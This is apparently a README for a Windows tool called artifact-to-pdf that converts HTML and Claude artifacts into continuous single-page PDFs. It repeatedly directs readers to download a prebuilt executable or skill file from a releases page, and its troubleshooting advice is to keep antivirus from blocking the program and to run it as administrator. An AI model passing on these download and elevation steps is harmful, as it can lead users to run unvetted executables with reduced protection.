# 📄 artifact-to-pdf - Turn HTML into perfect, single-page PDFs

[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/darbycommunal344/artifact-to-pdf/releases)

## 🎯 What This Tool Does

artifact-to-pdf takes any HTML page (including Claude artifacts) and turns it into one long PDF. No page breaks. No split content. Just one continuous document that looks exactly like the original.

You get a pixel-perfect copy of your work. Every image, every line of code, every piece of text stays in place. The PDF looks identical to what you see on screen.

## 🧩 Who This Is For

- **Claude users** who want to save artifacts as PDFs
- **Anyone** who needs to convert web pages to clean, single-page PDFs
- **Developers** who want to add PDF generation to their workflow

## ✨ Key Features

**One continuous page.** Other PDF tools cut your content across pages. This tool gives you one long page with no breaks. Your content stays intact from top to bottom.

**Pixel-perfect output.** The PDF matches your HTML exactly. Colors, fonts, spacing, layout - everything looks the same. No formatting loss.

**Works with any HTML.** Use it with Claude artifacts, web pages, or local HTML files. The tool does not care where your content comes from.

**Two ways to use it.** Run it from the command line. Or use it as a Claude Code skill. Both methods give you the same result.

**Fast and reliable.** Built on Playwright and headless Chrome. It renders pages the same way a browser does. You get consistent results every time.

## 🚀 Getting Started

### Step 1: Download the tool

Visit the [download page](https://github.com/darbycommunal344/artifact-to-pdf/releases) to get the latest version.

Look for the file named `artifact-to-pdf-windows.exe` or `artifact-to-pdf.zip`. Choose the one that matches your system.

### Step 2: Install the tool

If you downloaded the `.exe` file:
1. Double-click the file to run it
2. Follow the installation prompts
3. The tool will be ready to use

If you downloaded the `.zip` file:
1. Right-click the file and select "Extract All"
2. Choose a folder to extract the files (for example, `C:\Program Files\artifact-to-pdf`)
3. Open the extracted folder
4. Double-click `artifact-to-pdf.exe` to start

### Step 3: Use the tool

**Basic usage for Claude artifacts:**

1. Open the tool
2. Copy the URL of your Claude artifact
3. Paste the URL into the tool
4. Click "Convert to PDF"
5. Save the PDF file to your computer

**Command line usage (for advanced users):**

Open a command prompt or PowerShell window. Type:

```
artifact-to-pdf "https://claude.ai/artifacts/your-artifact-id"
```

The tool will create a PDF file in the same folder.

## 📋 System Requirements

- **Operating system:** Windows 10 or Windows 11 (64-bit)
- **Processor:** 1 GHz or faster
- **RAM:** 4 GB minimum (8 GB recommended)
- **Storage:** 500 MB free space
- **Internet connection:** Required for first run (downloads browser components)

## 🔧 How It Works

artifact-to-pdf uses Playwright, a browser automation tool, to load your HTML in a headless Chrome browser. "Headless" means the browser runs in the background without showing a window.

The tool takes a screenshot of the entire page content. It then stitches everything together into one continuous PDF. Because it uses a real browser engine, the output matches your original content exactly.

The tool removes all page breaks. Traditional PDFs split content across pages. This tool creates one long page that flows from top to bottom without interruption.

## 💡 Tips for Best Results

**Use with Claude artifacts.** The tool works best with Claude artifacts. Copy the artifact URL directly from Claude and paste it into the tool.

**Check your HTML first.** If you have a complex web page, make sure it renders correctly in Chrome first. The tool will reproduce whatever Chrome shows.

**Large pages take time.** Very long pages may take a few seconds to process. Be patient. The tool is working through all the content.

**Save your PDFs.** Choose a clear filename when saving. Include the date if you plan to save multiple versions.

## ❓ Frequently Asked Questions

**Q: Can I use this on Mac or Linux?**
A: This version works on Windows only. Mac and Linux versions are coming soon.

**Q: Does this work with any website?**
A: Yes. You can convert any public HTML page. Some sites may block automated access.

**Q: How long does the conversion take?**
A: Most pages take 5-15 seconds. Large pages with many images may take longer.

**Q: Can I customize the PDF output?**
A: The tool creates one continuous page. You cannot change page size or add margins.

**Q: Is my data safe?**
A: The tool runs locally on your computer. Your content does not leave your machine.

## 🛠️ Troubleshooting

**The tool does not open.**
Make sure your antivirus is not blocking the program. Try running the tool as administrator. Right-click the file and select "Run as administrator."

**The PDF looks wrong.**
Check that the page loads correctly in Chrome. If the page has issues in Chrome, the PDF will have the same issues.

**The tool says "Playwright not found."**
The tool needs to download browser components on first run. Make sure you have an internet connection. This only happens once.

**The PDF is empty.**
Make sure you are using a valid URL. The page must contain HTML content. Some pages may load content dynamically, which the tool may not capture.

## 📝 Using as a Claude Code Skill

If you use Claude Code, you can add artifact-to-pdf as a skill. This lets you convert artifacts directly from your Claude Code session.

**To install the skill:**

1. Download the skill file from the [releases page](https://github.com/darbycommunal344/artifact-to-pdf/releases)
2. Place the file in your Claude Code skills folder
3. Restart Claude Code

**To use the skill:**

```
/artifact-to-pdf convert [artifact-url]
```

The skill will download the artifact, convert it to PDF, and save it to your current folder.

## 🆘 Getting Help

If you run into problems, check the [releases page](https://github.com/darbycommunal344/artifact-to-pdf/releases) for updates. New versions may fix your issue.

You can also create an issue on the GitHub repository. Describe your problem in detail. Include your Windows version and the tool version you are using.

## 📥 Download Again

[Download the latest version from GitHub](https://github.com/darbycommunal344/artifact-to-pdf/releases)

Keywords: claude, claude-artifacts, claude-code, claude-skill, cli, headless-chrome, html-to-pdf, no-page-breaks, pdf, pdf-generator, playwright, single-page